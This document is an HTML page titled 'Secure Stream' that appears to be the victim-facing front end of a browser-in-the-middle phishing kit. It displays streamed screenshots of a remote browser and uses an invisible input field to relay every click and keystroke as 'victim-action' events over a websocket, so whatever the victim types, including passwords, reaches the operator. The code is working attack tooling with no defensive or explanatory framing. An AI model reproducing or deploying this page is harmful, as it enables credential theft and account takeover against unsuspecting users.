<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Secure Stream</title>
    <style>
        body { background: #000; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        #mirror { max-width: 100%; max-height: 100%; object-fit: contain; display: none; touch-action: none; z-index: 1; }
        #loader { color: #555; font-family: sans-serif; font-size: 14px; }
        /* The Hidden Bridge */
        #kbd-bridge {
            position: absolute;
            opacity: 0;
            pointer-events: none;
            z-index: 0;
        }
    </style>
</head>
<body>
    <div id="loader">INITIALIZING_SECURE_STREAM...</div>
    <input type="text" id="kbd-bridge" autocomplete="off" autoconfirmed="off">
    <img id="mirror" draggable="false" />

    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
    <script>
        const socket = io({ transports: ['websocket'] });
        const img = document.getElementById('mirror');
        const loader = document.getElementById('loader');
        const bridge = document.getElementById('kbd-bridge');

        socket.on('browser-render', (data) => {
            if (data.screenshot) {
                loader.style.display = 'none';
                img.style.display = 'block';
                img.src = 'data:image/jpeg;base64,' + data.screenshot;
            }
        });

        img.addEventListener('pointerdown', (e) => {
            const rect = img.getBoundingClientRect();
            const scaleX = 1280 / rect.width;
            const scaleY = 720 / rect.height;
            const x = Math.round((e.clientX - rect.left) * scaleX);
            const y = Math.round((e.clientY - rect.top) * scaleY);

            // 1. Send the click
            socket.emit('victim-action', { type: 'click', x, y });

            // 2. Force focus to open mobile keyboard
            bridge.focus();
        });

        // Capture actual typing from the hidden field
        bridge.addEventListener('input', (e) => {
            const char = e.data; 
            if (char) {
                socket.emit('victim-action', { type: 'key', key: char });
                bridge.value = ''; // Clear so the next character triggers 'input' again
            }
        });

        // Handle Backspace (which doesn't trigger 'input' with e.data)
        bridge.addEventListener('keydown', (e) => {
            if (e.key === 'Backspace' || e.key === 'Enter') {
                socket.emit('victim-action', { type: 'key', key: e.key });
            }
        });
    </script>
</body>
</html>
